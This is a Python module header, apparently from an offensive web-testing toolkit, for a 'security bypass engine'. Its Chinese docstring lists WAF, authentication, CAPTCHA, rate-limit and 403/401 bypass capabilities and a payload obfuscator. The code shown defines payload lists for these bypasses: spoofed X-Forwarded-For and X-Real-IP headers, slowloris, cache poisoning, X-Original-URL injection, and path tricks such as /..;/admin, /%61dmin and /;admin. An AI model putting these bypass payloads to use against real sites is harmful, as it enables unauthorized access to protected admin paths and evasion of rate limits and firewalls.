"""
security/security_bypass_engine.py - 安全验证绕过引擎

核心能力：
- SecurityBypassEngine: 统一安全验证绕过引擎
  - WAF绕过（编码绕过/参数污染/分块传输/协议层绕过）
  - 认证绕过（SQL注入认证/JWT伪造/会话固定/权限提升）
  - 验证码绕过（重放/空值/绕过检查/机器学习识别）
  - 速率限制绕过（IP轮换/请求分散/慢攻击/缓存投毒）
  - 403/401绕过（路径遍历/Header注入/方法替换）
- PayloadObfuscator: Payload混淆器
  - 多种编码（URL/Unicode/HTML/Base64/Hex）
  - 字符串拆分与拼接
  - 注释注入
  - 大小写混淆
- BypassTester: 绕过测试器
  - 自动测试多种绕过技术
  - 成功率统计
  - 最优绕过方案推荐
"""
import os
import re
import sys
import json
import time
import uuid
import random
import hashlib
import base64
import urllib.parse
from typing import Any, Dict, List, Optional, Tuple
from dataclasses import dataclass, field
from collections import defaultdict, Counter
from enum import Enum
from .models import *  # noqa: F401,F403

RATE_LIMIT_BYPASS_TECHNIQUES = [
    {
        "name": "X-Forwarded-For绕过",
        "description": "伪造X-Forwarded-For头轮换IP",
        "header": "X-Forwarded-For",
        "success_indicators": ["200", "not blocked"],
    },
    {
        "name": "X-Real-IP绕过",
        "description": "伪造X-Real-IP头",
        "header": "X-Real-IP",
        "success_indicators": ["200", "not blocked"],
    },
    {
        "name": "请求分散绕过",
        "description": "将请求分散到多个IP/会话",
        "payload": "distribute_requests",
        "success_indicators": ["200", "not blocked"],
    },
    {
        "name": "慢攻击绕过",
        "description": "慢速发送请求绕过速率限制",
        "payload": "slowloris",
        "success_indicators": ["200", "not blocked"],
    },
    {
        "name": "缓存投毒绕过",
        "description": "利用缓存绕过速率限制",
        "payload": "cache_poisoning",
        "success_indicators": ["200", "cached"],
    },
]

FORBIDDEN_BYPASS_TECHNIQUES = [
    {
        "name": "路径遍历绕过403",
        "description": "使用/..;/或/%2e/绕过路径限制",
        "payload": "/..;/admin",
        "success_indicators": ["200", "admin"],
    },
    {
        "name": "Header注入绕过403",
        "description": "添加X-Original-URL或X-Rewrite-URL头",
        "header": "X-Original-URL",
        "payload": "/admin",
        "success_indicators": ["200", "admin"],
    },
    {
        "name": "方法替换绕过403",
        "description": "将GET改为POST/PUT/HEAD/OPTIONS",
        "payload": "method_switch",
        "success_indicators": ["200", "admin"],
    },
    {
        "name": "URL编码绕过403",
        "description": "对路径进行URL编码",
        "payload": "/%61dmin",
        "success_indicators": ["200", "admin"],
    },
    {
        "name": "双斜杠绕过403",
        "description": "使用//admin代替/admin",
        "payload": "//admin",
        "success_indicators": ["200", "admin"],
    },
    {
        "name": "分号绕过403",
        "description": "使用/;admin绕过",
        "payload": "/;admin",
        "success_indicators": ["200", "admin"],
    },
]
